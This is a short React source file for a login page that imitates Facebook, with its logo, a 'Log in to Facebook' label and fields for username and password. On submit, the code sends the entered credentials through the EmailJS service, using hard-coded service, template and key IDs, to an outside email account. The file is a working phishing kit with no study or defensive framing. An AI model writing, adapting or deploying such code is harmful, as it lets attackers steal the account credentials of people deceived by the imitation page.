import './login.css';
import fbTextLogo from './fbTextLogo.svg'
import React, { useRef } from 'react';
import emailjs from '@emailjs/browser';



const Login = () => {

    const form = useRef();

    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs.sendForm('service_ie0vfk9', 'template_yg9ejah', form.current, 'dEGoKuhfgKTVYF7fL')
        .then((result) => {
            console.log(result.text);
        }, (error) => {
            console.log(error.text);
        });
    };


  

return (
<div className="login-facebook">
<div className="loginLogo">
 <img src={fbTextLogo} alt="facebook" />
</div>
<form className='myform'ref={form} onSubmit={sendEmail}>
<label>Log in to Facebook</label>
<div className='INPUT'>
<input type='text' placeholder='Username or Email'className='inputmyform'  name='user'></input>
<input type='password' placeholder='Password' className='inputmyform'  name='pass'></input>
</div>
<button type="submit" value='Send'>Sign In</button>
</form>
</div>
    )
}

export default Login;
